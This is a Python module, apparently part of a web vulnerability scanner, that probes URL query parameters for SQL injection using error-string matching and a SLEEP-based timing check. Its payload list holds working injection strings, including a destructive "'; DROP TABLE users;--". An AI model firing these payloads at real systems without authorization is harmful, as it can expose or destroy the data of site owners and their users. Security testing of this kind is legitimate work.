import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http_client import get
from modules.severity import SEVERITY

SQL_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ORA-01756",
    "SQLite/JDBCDriver",
    "pg_query",
    "quoted string not properly terminated"
]

PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "'; DROP TABLE users;--"
]

def scan_sqli(url, report):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return

    report.write("  [SQLi] Testing parameters...")

    for payload in PAYLOADS:
        for param in params:
            test = params.copy()
            test[param] = payload

            new_query = urlencode(test, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                r = get(test_url)
                text = r.text.lower()

                for error in SQL_ERRORS:
                    if error in text:
                        report.write(
                            f"{SEVERITY['SQLI']} SQL Injection detected at parameter: {param}"
                        )
                        report.write(f"URL: {test_url}")
                        return
            except:
                pass

    # Time-based check
    time_payload = "'; SLEEP(5)--"
    for param in params:
        test = params.copy()
        test[param] = time_payload

        new_query = urlencode(test, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            start = time.time()
            get(test_url)
            delay = time.time() - start

            if delay > 4:
                report.write(
                    f"{SEVERITY['SQLI']} Time-based SQLi detected at {param}"
                )
                return
        except:
            pass

